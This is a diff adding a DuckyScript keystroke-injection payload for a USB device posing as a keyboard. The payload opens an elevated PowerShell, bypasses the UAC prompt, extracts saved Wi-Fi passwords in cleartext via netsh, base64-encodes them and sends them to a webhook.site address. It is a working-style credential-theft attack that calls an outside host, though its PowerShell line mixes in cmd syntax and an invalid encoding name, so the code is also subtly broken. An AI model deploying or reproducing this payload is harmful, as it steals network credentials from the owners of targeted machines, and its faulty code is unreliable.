@@ -1,0 +1,15 @@
+ID 05ac:021e
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell
+CTRL SHIFT ENTER
+DELAY 1500
+LEFT
+ENTER
+DELAY 1500
+STRING $wifi = (for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @if "%j" NEQ "" (echo SSID: %j & netsh wlan show profiles %j key=clear | findstr "Schl")); $b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF-8.GetBytes($wifi)); iwr -Uri "https://webhook.site/1a883927-dc3b-409e-8446-d20e7c0e7fc3?data=$b64" -Method Get
+ENTER
+DELAY 1000
+STRING exit
+ENTER
